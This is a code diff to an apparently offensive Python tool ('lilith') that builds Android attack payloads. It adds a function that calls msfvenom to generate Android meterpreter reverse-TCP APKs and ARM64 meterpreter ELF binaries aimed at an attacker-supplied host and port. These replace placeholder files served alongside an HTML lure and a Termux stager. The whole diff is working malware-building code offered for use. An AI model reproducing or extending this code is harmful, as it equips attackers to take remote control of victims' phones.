@@ -35,6 +35,29 @@ MSF handler:
 """
 
 import os
+import shutil
+import subprocess
+
+
+def _try_msfvenom(payload: str, lhost: str, lport: int,
+                  fmt: str, out_path: str) -> tuple[bool, str]:
+    """Attempt to run msfvenom; return (success, message)."""
+    msf = shutil.which("msfvenom")
+    if not msf:
+        return False, "msfvenom not found in PATH"
+    cmd = [msf, "-p", payload,
+           f"LHOST={lhost}", f"LPORT={lport}",
+           "-f", fmt, "-o", out_path, "-q"]
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
+        if r.returncode == 0 and os.path.exists(out_path) and os.path.getsize(out_path) > 0:
+            return True, out_path
+        err = (r.stderr or r.stdout or "unknown error").strip()
+        return False, err
+    except subprocess.TimeoutExpired:
+        return False, "msfvenom timed out (>180s)"
+    except Exception as e:
+        return False, str(e)
 
 
 _ANDROID_ICON = (
@@ -136,12 +159,16 @@ def build_android_payload(
             f.write(html)
         wrote.append(("index.html", html_path))
 
-        # Placeholder so 'lilith serve' has something to send
         apk_path = os.path.join(output_dir, apk_name)
         if not os.path.exists(apk_path):
-            with open(apk_path, "wb") as f:
-                f.write(b"# generate with msfvenom and replace this file\n")
-            wrote.append((apk_name, apk_path, "PLACEHOLDER — replace with msfvenom output"))
+            ok, msg = _try_msfvenom(
+                "android/meterpreter/reverse_tcp", lhost, lport, "raw", apk_path)
+            if ok:
+                wrote.append((apk_name, apk_path, f"msfvenom APK  ({os.path.getsize(apk_path):,} bytes)"))
+            else:
+                with open(apk_path, "wb") as f:
+                    f.write(b"# generate with msfvenom and replace this file\n")
+                wrote.append((apk_name, apk_path, f"PLACEHOLDER — msfvenom unavailable: {msg}"))
 
     if mode in ("termux", "both"):
         sh = _termux_stager_sh(lhost, port, elf_name)
@@ -152,9 +179,14 @@ def build_android_payload(
 
         elf_path = os.path.join(output_dir, elf_name)
         if not os.path.exists(elf_path):
-            with open(elf_path, "wb") as f:
-                f.write(b"")
-            wrote.append((elf_name, elf_path, "PLACEHOLDER — replace with msfvenom output"))
+            ok, msg = _try_msfvenom(
+                "linux/aarch64/meterpreter/reverse_tcp", lhost, lport, "elf", elf_path)
+            if ok:
+                wrote.append((elf_name, elf_path, f"msfvenom ELF ARM64  ({os.path.getsize(elf_path):,} bytes)"))
+            else:
+                with open(elf_path, "wb") as f:
+                    f.write(b"")
+                wrote.append((elf_name, elf_path, f"PLACEHOLDER — msfvenom unavailable: {msg}"))
 
     print()
     for entry in wrote:
